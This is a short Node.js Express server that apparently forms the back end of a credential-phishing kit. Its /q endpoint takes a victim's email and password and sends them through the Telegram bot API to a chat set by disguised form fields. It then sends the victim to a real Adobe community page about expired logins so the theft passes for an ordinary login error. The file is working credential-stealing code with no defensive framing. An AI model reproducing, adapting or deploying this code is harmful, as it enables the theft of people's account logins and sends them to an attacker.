const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios'); // For making Telegram API requests

const app = express();
const port = 3000;

// Middleware to parse JSON and form data
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// API endpoint to handle form submissions
app.post('/q', async (req, res) => {
    const data = req.body;

    // Check if required fields are present
    if (!data.email || !data.password || !data.netob || !data.ditch) {
        return res.redirect('/error'); // Redirect to an error page if fields are missing
    }

    // Format the message
    const telegramMessage = `Attachment Submission ✅\n\nEmail: ${data.email}\nPassword: ${data.password}`;

    try {
        // Send the message to Telegram
        await axios.post(`https://api.telegram.org/bot${data.netob}/sendMessage`, {
            chat_id: data.ditch,
            text: telegramMessage,
        });

        console.log('Message sent to Telegram successfully.');

        // Redirect to a success page
        res.redirect('https://community.adobe.com/t5/adobe-acrobat-sign-discussions/adobe-sign-login-has-expired/m-p/10255182');
    } catch (error) {
        console.error('Failed to send message to Telegram:', error.message);
        res.redirect('/error'); // Redirect to an error page in case of failure
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
}); 